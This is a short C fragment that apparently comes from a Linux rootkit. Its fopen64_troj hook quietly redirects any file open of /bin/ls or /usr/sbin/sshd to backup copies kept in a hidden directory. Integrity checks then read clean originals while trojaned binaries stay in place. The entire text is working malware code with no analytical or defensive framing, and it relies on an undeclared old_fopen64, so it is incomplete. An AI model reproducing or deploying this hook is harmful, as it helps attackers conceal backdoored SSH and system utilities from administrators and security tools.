 #include <stdlib.h>

 #define HIDDEN_DIR      "/path/to/hidden/dir"
 #define LS              "/bin/ls"
 #define SSHD            "/usr/sbin/sshd"
 #define LS_BAQ          "ls.baq"
 #define SSHD_BAQ        "sshd.baq"

 int     mystrcmp(char *str1, char *str2)
 {
   u_int cnt;

   for (cnt = 0; str1[cnt] && str2[cnt]; cnt++)
     if (str1[cnt] != str2[cnt])
       return (str1[cnt] - str2[cnt]);
   return (str1[cnt] - str2[cnt]);
 }

 int     fopen64_troj(char *str1, char *str2)
 {
   if (!mystrcmp(str1, LS))
     str1 = HIDDEN_DIR "/" LS_BAQ;
   else if (!mystrcmp(str1, SSHD))
     str1 = HIDDEN_DIR "/" SSHD_BAQ;
   return (old_fopen64(str1, str2));
 }
